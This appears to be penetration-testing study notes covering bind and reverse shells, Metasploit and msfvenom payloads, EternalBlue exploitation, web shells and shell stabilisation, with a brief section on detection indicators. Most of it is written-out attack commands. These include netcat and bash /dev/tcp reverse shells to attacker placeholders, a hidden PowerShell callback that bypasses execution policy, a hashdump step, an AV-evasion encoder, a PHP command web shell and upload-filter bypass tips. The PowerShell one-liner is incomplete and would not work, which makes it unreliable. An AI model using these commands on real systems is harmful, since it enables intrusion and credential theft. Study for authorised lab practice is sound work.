# 1️⃣ Shell Basics

## 🔹 What is a Shell?

A **shell** provides command-line access to a system. In penetration testing, a shell is usually obtained after exploiting a vulnerability.

Two primary types:

- **Bind Shell**
    
- **Reverse Shell**
    

---

## 🔹 Bind Shell (Linux Host)

![Image](https://cdn.prod.website-files.com/681e366f54a6e3ce87159ca4/6877c6d94cd1d4bca7c48143_bind-shell-vs-reverse-shell-01.png)

![Image](https://cdn.prod.website-files.com/640f78d90b310438f1fab4be/66cf91211594c7f5a845ee99_667d905e84f300540472432a_ThreatLocker_Blog%2520Header_Netcat%2520Bind%2520Shell%2520%25201.png)

![Image](https://i.sstatic.net/2PKQI.jpg)

![Image](https://1.bp.blogspot.com/-EKsaDXthoeI/Xw4Sak5UtGI/AAAAAAAAl2Y/wOk_MchhNgIWC7xusRh2AnfJJnKFcKkxgCLcBGAsYHQ/s1600/13.png)

### 📌 How It Works

- Target opens a port and listens.
    
- Attacker connects to that open port.
    
- Shell access is established.
    

### 📌 Basic Netcat Example (Linux Target)

**On Target (Victim):**

```bash
nc -lvnp 4444 -e /bin/bash
```

**On Attacker:**

```bash
nc <target_ip> 4444
```

### ⚠ Important Notes

- Requires inbound access to victim.
    
- Blocked by firewalls/NAT.
    
- Less stealthy than reverse shell.
    

---

## 🔹 Reverse Shell (Windows Host)

![Image](https://cdn.prod.website-files.com/681e366f54a6e3ce87159ca4/6877c6d94cd1d4bca7c48143_bind-shell-vs-reverse-shell-01.png)

![Image](https://miro.medium.com/1%2AMsEQUM0AFi2DICOmfk7mRg.png)

![Image](https://www.varonis.com/hubfs/Imported_Blog_Media/netcat-commands-port-scan-2.png?hsLang=en)

![Image](https://app.trustline.sa/media/blog/2024/08/12/figure-11.jpeg)

### 📌 How It Works

- Attacker starts listener.
    
- Victim connects back to attacker.
    
- Bypasses firewall restrictions.
    

### 📌 Windows PowerShell Reverse Shell

**On Attacker:**

```bash
nc -lvnp 4444
```

**On Victim (Windows):**

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444);
```

### ⚠ Important Notes

- More common in real-world engagements.
    
- Works better behind NAT/firewalls.
    
- Requires egress access from victim.
    

---

# 2️⃣ Payload Basics

## 🔹 What is a Payload?

A **payload** is the code that executes after exploitation. It delivers functionality such as:

- Reverse shell
    
- Meterpreter session
    
- File execution
    
- Privilege escalation
    

---

## 🔹 Launching a Payload from MSF

Using: Metasploit Framework

![Image](https://www.offsec.com/_astro/msfconsolehelp-2_ZM0D9Q.webp)

![Image](https://www.offsec.com/_astro/Screen-Shot-2016-04-05-at-12.17.19-PM_ZE92Vo.webp)

![Image](https://docs.rapid7.com/images/metasploit/m_shell_commands.png)

![Image](https://docs.rapid7.com/images/metasploit/meterpreter_pro.png)

### 📌 Example:

```bash
msfconsole
```

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target_ip>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <attacker_ip>
run
```

### Key Concepts

- `exploit` = delivery method
    
- `payload` = shell functionality
    
- `LHOST` = attacker IP
    
- `RHOSTS` = victim IP
    

---

## 🔹 Searching & Building Payload from PoC (ExploitDB)

Using: Exploit Database

![Image](https://www.exploit-db.com/images/searchsploit-v3.png)

![Image](https://www.exploit-db.com/images/searchsploit-example.png)

![Image](https://www.code-intelligence.com/hs-fs/hubfs/Global%20Buffer%20overflow.webp?height=1332&name=Global+Buffer+overflow.webp&width=2196)

![Image](https://upload.wikimedia.org/wikipedia/commons/d/d0/Buffer_overflow_basicexample.svg)

### 📌 Steps:

1. Search exploit:
    

```bash
searchsploit apache 2.4
```

2. Copy exploit:
    

```bash
searchsploit -m 12345
```

3. Modify shellcode:
    

- Change IP
    
- Change Port
    
- Recompile if required
    

---

## 🔹 Payload Creation (msfvenom)

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe > shell.exe
```

### Formats:

- exe
    
- elf
    
- asp
    
- php
    
- raw
    
- war
    

### Encoders:

```bash
-e x86/shikata_ga_nai
```

⚠ Encoding does NOT guarantee AV evasion.

---

# 3️⃣ Getting a Shell on Windows

## 📌 Workflow

1. Recon (Nmap, SMB enumeration)
    
2. Identify vulnerability
    
3. Select exploit
    
4. Select payload
    
5. Execute
    
6. Catch shell
    

Example:

- SMB vulnerable → MS17-010
    
- Use EternalBlue module
    
- Payload → meterpreter reverse_tcp
    

### Post Exploitation:

```bash
sysinfo
getuid
hashdump
```

---

# 4️⃣ Getting a Shell on Linux

## 📌 Workflow

1. Scan:
    

```bash
nmap -sC -sV <target>
```

2. Identify:
    

- SSH weak creds
    
- Web RCE
    
- Misconfigured service
    

3. Exploit:
    

- Use public exploit
    
- Modify reverse shell
    
- Catch listener
    

Example Reverse Shell:

```bash
bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1
```

---

# 5️⃣ Landing a Web Shell

## 🔹 What is a Web Shell?

A web shell is a malicious script uploaded to a web server to execute system commands via browser.

Common Web Apps:

- WordPress → PHP
    
- Joomla → PHP
    
- Drupal → PHP
    
- ASP.NET apps → ASPX
    

---

## 🔹 PHP Web Shell Example

```php
<?php system($_GET['cmd']); ?>
```

Access:

```
http://target/shell.php?cmd=whoami
```

![Image](https://raw.githubusercontent.com/artyuum/Simple-PHP-Web-Shell/master/screenshot.png)

![Image](https://cdn.prod.website-files.com/645a45d56fc4750d4edd96fe/65a8aca63663e691989b7aef_Web-Shells-BLOG.webp)

![Image](https://portswigger.net/web-security/file-upload/images/file-upload-vulnerabilities.jpg)

![Image](https://images.contentstack.io/v3/assets/blt281ecbfc2563bf9b/blta0bf65c8794142e0/67a65597bdc8b5209b8656cf/Figure-1_UploadHandler.JPG)

### ⚠ Important

- Check file upload restrictions
    
- Bypass extension filters (.php.jpg)
    
- Use Burp for interception
    

---

# 6️⃣ Spotting a Shell or Payload

## 🔍 Indicators of Compromise (IOCs)

- Suspicious processes:
    

```bash
ps aux
```

- Unusual listening ports:
    

```bash
netstat -antp
```

- Suspicious scheduled tasks
    
- PowerShell encoded commands
    
- Base64 strings
    
- Strange outbound connections
    

Example:

```
powershell -enc aQBlAHgA...
```

---

# 7️⃣ Final Challenge Strategy

## 🔥 Attack Methodology

1. Enumeration
    
2. Identify attack vector
    
3. Select exploit
    
4. Craft payload
    
5. Start listener
    
6. Deliver payload
    
7. Stabilize shell
    
8. Privilege escalate
    
9. Extract required info
    

---

## 🔹 Shell Stabilization (Linux)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo
export TERM=xterm
```

---

## 🔹 Windows Stabilization

Use Meterpreter:

```bash
background
sessions -i 1
```

Or upgrade shell:

```bash
post/multi/manage/shell_to_meterpreter
```

---

# 🧠 Key Differences Summary

|Feature|Bind Shell|Reverse Shell|
|---|---|---|
|Who initiates|Attacker|Victim|
|Firewall bypass|❌|✅|
|Stealth|Low|Higher|
|Real-world use|Rare|Common|

---

# 🚀 What Senior Team Members Want to See

✔ Proper listener setup  
✔ Correct payload selection  
✔ Understanding of architecture (x86 vs x64)  
✔ Correct LHOST/LPORT configuration  
✔ Shell stabilization  
✔ Ability to detect malicious shells  
✔ Clean methodology

---

# 📌 Important Reminders

- Always match payload architecture.
    
- Check AV/EDR presence.
    
- Validate exploit reliability.
    
- Avoid noisy scans.
    
- Document everything.